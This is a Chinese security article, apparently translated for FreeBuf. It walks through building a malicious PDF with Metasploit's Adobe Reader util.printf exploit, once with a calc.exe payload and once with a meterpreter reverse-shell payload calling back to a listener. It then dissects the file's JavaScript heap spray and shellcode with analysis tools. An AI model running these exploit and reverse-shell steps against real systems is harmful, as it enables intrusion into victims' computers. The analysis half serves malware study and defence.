****

**Acrobat
Reader是一个可阅读、搜索、打印几乎任何类型的PDF文件并与之交互的PDF查看程序。不夸张的说，几乎每个电脑用户都安装并使用过它。由于它的用户范围广泛且安全问题频出，因此它也成为了最容易被黑客利用的程序之一。通过度娘搜索“Acrobat
Reader漏洞”那叫一个壮观，动不动就是高危，看得我都手痒痒了~~**  

在本文中，我将向大家展示创建恶意PDF文档，触发并利用漏洞的完整过程。此外，我还将带大家深入分析恶意PDF文档，了解payload的存储方式以及提取方法。

 **本文仅适用于研究教育目的！切勿非法破坏！**

## PDF格式

PDF（便携式文件格式，Portable Document Format）是由Adobe在1993年用于文件交换所发展出的文件格式。

PDF主要由三项技术组成：衍生自PostScript；字型嵌入系统；资料压缩及传输系统。它的优点在於跨平台、能保留文件原有格式（Layout）、开放标准，能免版税（Royalty-free）自由开发PDF相容软体，是一个开放标准。以下是一个典型PDF文档的结构图。有关更多信息，请参阅[Adobe规范](http://partners.adobe.com/public/developer/tips/topic_tip31.html)。

![恶意PDF文档分析以及payload提取方法](https://image.3001.net/images/20180727/1532644607_5b5a4cff84487.png!small)

##  **恶意PDF创建**

我们将使用[metasploit](http://www.metasploit.com/)来创建一个恶意伪造的PDF文档，其中将包含exploit以及我们自定义的payload。因为该漏洞利用是针对特定版本的，因此我们需要在目标机器上下载安装一个较早版本的Reader。

首先，我们来创建PDF。该PDF利用成功后会在目标机器上弹出计算器（calc.exe）。打开metasploit console并键入以下命令：

    
    
    use exploit/windows/fileformat/adobe_utilprintf
    set FILENAME malicious.pdf
    set PAYLOAD windows/exec
    set CMD calc.exe
    show options
    exploit

如下所示：

![恶意PDF文档分析以及payload提取方法](https://image.3001.net/images/20180727/1532644626_5b5a4d129db0b.png!small)

将刚创建的文件（/home/osboxes/.msf4/local/malicious.pdf）复制到共享驱动器上。

## 执行受感染PDF

在目标计算机上，下载并安装易受攻击的Adobe
Reader版本（metasploit已经告诉我们版本应小于8.1.2）。我选择[安装的是8.1.1版](http://www.oldapps.com/adobe_reader.php?old_adobe=16)。

安装后，我们执行malicious.pdf文件。你应该会看到从Adobe Reader进程生成的计算器。漏洞成功被利用。

![恶意PDF文档分析以及payload提取方法](https://image.3001.net/images/20180727/1532644670_5b5a4d3ecd21f.png!small)

我准备了另一个恶意PDF，使用了不同的payload，如下：

    
    
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 192.168.1.29
    set LPORT 4455

结果如下，我们成功在Adobe Reader上建立了一个后门（反向shell）。

![恶意PDF文档分析以及payload提取方法](https://image.3001.net/images/20180727/1532644690_5b5a4d5254bc3.png!small)

## 分析受感染PDF

现在，让我们来看看恶意PDF中的内容，并尝试提取其中的payload（我们仍然以calc.exe PDF为例）。

首先，我们需要用到一个名为[PDF Stream
Dumper的工具](http://sandsprite.com/blogs/index.php?uid=7&pid=57)，下载并安装它。然后使用该工具加载我们的恶意PDF文档（请花些时间熟悉该工具的基本使用）。

![恶意PDF文档分析以及payload提取方法](https://image.3001.net/images/20180727/1532644709_5b5a4d6537481.png!small)

我们先来使用菜单栏中的 “Exploit Scan” 选项来检测是否存在某些可利用漏洞：

    
    
    Exploit CVE-2008-2992 Date:11.4.08 v8.1.2 - util.printf - found in stream: 6

实际上，在stream 6中隐藏了一个可利用漏洞。

但是如果我们从头开始：在PDF中搜索漏洞时，我们大多数时候会遇到由Javascript代码创建的堆喷射（ ****[heap
spray](https://en.wikipedia.org/wiki/Heap_spraying)）。该堆喷射用于将payload推送至堆上，一旦漏洞被触发就可以执行。

如果你打开Stream 1，你可以看到：

    
    
    /Type/Catalog/Outlines 2 0 R/Pages 3 0 R/OpenAction 5 0 R

接着，我们打开stream 5：

    
    
    /Type/Action/S/JavaScript/JS 6 0 R

执行位于stream
6的Javascript。该流显示了纯Javascript，现在是时候打开“Javascript_UI”菜单了。可以看到这是一大串十六进制编码的字符，我们将其push到一个变量，以执行heap
spray操作。以下是我们的payload：

![恶意PDF文档分析以及payload提取方法](https://image.3001.net/images/20180727/1532644740_5b5a4d8464209.png!small)

我们选择payload（引号之间的部分），然后打开“Shellcode_analysis”菜单。选择“scDbg - LibEmu
Emulation”。此时，会弹出一个新的窗口并将shellcode解码为字节（你甚至可以将其保存到文件中）：

![恶意PDF文档分析以及payload提取方法](https://image.3001.net/images/20180727/1532644759_5b5a4d97bd504.png!small)

LibEmu是一个能够模拟处理器的库，它会告知你汇编代码的执行信息，单击“Launch”按钮，一看你就明白了：

![恶意PDF文档分析以及payload提取方法](https://image.3001.net/images/20180727/1532644782_5b5a4dae0c2a4.png!small)

在这里，我们可以清楚地看到shellcode会打开一个calc.exe窗口并退出。让我们另外一个恶意PDF（反向shell）也执行相同的分析：

![恶意PDF文档分析以及payload提取方法](https://image.3001.net/images/20180727/1532644803_5b5a4dc3f09c7.png!small)

可以看到，Shellcode正在加载操作套接字所需的库（ws2_32.dll），并尝试回连C＆C。

这里我并没有展开谈论exploit本身，它位于javascript代码的末尾。它正在利用printf函数上的缓冲区溢出来执行任意代码。以下是我们的heap-sprayed shellcode：

    
    
    util.printf("%45000.45000f", 0);

## 参考链接：

> – <http://www.sans.org/reading-room/whitepapers/malicious/owned-malicious-> pdf-analysis-33443>  
> – <http://www.oldapps.com/adobe_reader.php>  
> – <http://contagiodump.blogspot.fr/2010/08/malicious-documents-archive-> for.html>  
> – <http://contagiodump.blogspot.fr/2013/03/16800-clean-and-11960-malicious-> files.html>  
> – <http://eternal-todo.com/blog/cve-2011-2462-exploit-analysis-peepdf>  
> – <http://blog.9bplus.com/analyzing-cve-2011-2462/>  
> – <https://www.fireeye.com/blog/threat-research/2012/07/analysis-of-a-> different-pdf-malware.html>  
> – <http://resources.infosecinstitute.com/analyzing-malicious-pdf/>

*******参考来源：[adlice](https://www.adlice.com/infected-pdf-extract-payload/)，**
**FB小编 secist 编译，转载请注明来自FreeBuf.COM**

